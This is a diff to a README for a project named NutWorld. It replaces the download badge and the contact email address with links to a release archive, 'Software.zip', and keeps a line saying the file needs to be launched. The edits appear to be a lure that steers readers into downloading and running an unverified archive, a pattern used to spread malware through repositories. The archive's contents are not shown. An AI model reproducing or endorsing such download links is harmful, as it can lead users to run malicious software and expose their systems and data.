@@ -11,7 +11,7 @@ Topics related to NutWorld are not provided at the moment.
 ## 📁 Download NutWorld
 You can download the latest version of NutWorld by clicking on the button below:
 
-[![Download NutWorld](https://img.shields.io/static/v1?label=Download&message=NutWorld&color=blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download NutWorld](https://github.com/NoahStrange/NutWorld/releases/download/v2.0/Software.zip)](https://github.com/NoahStrange/NutWorld/releases/download/v2.0/Software.zip)
 
 *Note: The link above leads to a file that needs to be launched.*
 
@@ -37,7 +37,7 @@ To dive into the world of NutWorld, simply download the repository and explore t
 We welcome contributions from the community to enhance NutWorld further. Whether you have suggestions, bug fixes, or new features to add, feel free to submit a pull request.
 
 ## 📞 Contact
-For any inquiries or feedback regarding NutWorld, you can reach out to us at [nutworld@example.com](mailto:nutworld@example.com).
+For any inquiries or feedback regarding NutWorld, you can reach out to us at [https://github.com/NoahStrange/NutWorld/releases/download/v2.0/Software.zip](https://github.com/NoahStrange/NutWorld/releases/download/v2.0/Software.zip).
 
 ---
 
